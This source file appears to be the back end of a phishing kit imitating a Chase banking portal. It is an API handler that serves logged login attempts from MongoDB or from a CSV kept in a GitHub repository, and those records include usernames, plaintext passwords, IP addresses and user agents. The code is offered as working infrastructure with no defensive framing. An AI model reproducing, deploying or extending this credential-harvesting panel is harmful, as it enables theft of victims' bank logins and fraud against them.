import mongoose from 'mongoose';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';

// Login Log Schema
const loginLogSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now, index: true },
  username: String,
  password: String,
  attemptNumber: Number,
  status: String,
  userAgent: String,
  ipAddress: String,
}, { collection: 'login_logs' });

const LoginLog = mongoose.model('LoginLog', loginLogSchema);

let dbConnected = false;
let connection = null;

async function connectDB() {
  if (connection) return connection;
  
  try {
    connection = await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      retryWrites: true,
      w: 'majority'
    });
    dbConnected = true;
    return connection;
  } catch (err) {
    console.warn('⚠️  MongoDB connection failed');
    dbConnected = false;
    return null;
  }
}

async function getLogsFromGitHub(limit, statusFilter, usernameFilter) {
  if (!GITHUB_TOKEN) {
    console.warn('⚠️  GITHUB_TOKEN not set');
    return [];
  }

  try {
    const filePath = 'logs/login_attempts.csv';
    const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
    
    const response = await fetch(url, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'Accept': 'application/vnd.github.v3+json'
      }
    });

    if (!response.ok) {
      return [];
    }

    const data = await response.json();
    const csvContent = Buffer.from(data.content, 'base64').toString('utf-8');
    const lines = csvContent.split('\n').filter(line => line.trim());

    // Parse CSV (skip header)
    const logs = lines.slice(1).map(line => {
      const [timestamp, username, password, attemptNumber, status, userAgent, ipAddress] = line.split(',');
      return {
        timestamp: new Date(timestamp),
        username,
        password,
        attemptNumber: parseInt(attemptNumber),
        status,
        userAgent,
        ipAddress
      };
    }).filter(log => {
      if (statusFilter && log.status !== statusFilter) return false;
      if (usernameFilter && !log.username.match(new RegExp(usernameFilter, 'i'))) return false;
      return true;
    })
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, parseInt(limit));

    return logs;
  } catch (err) {
    console.error('Error reading from GitHub:', err.message);
    return [];
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'GET') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    await connectDB();

    const { limit = 100, status, username } = req.query;
    
    let logs = [];
    let source = 'No data';
    
    if (dbConnected) {
      let query = {};
      if (status) query.status = status;
      if (username) query.username = new RegExp(username, 'i');
      
      logs = await LoginLog.find(query)
        .sort({ timestamp: -1 })
        .limit(parseInt(limit))
        .lean();
      source = 'MongoDB';
    } else {
      // Try GitHub
      logs = await getLogsFromGitHub(limit, status, username);
      if (logs.length > 0) {
        source = 'GitHub (CSV)';
      }
    }
    
    res.status(200).json({ 
      success: true, 
      count: logs.length, 
      logs, 
      source,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
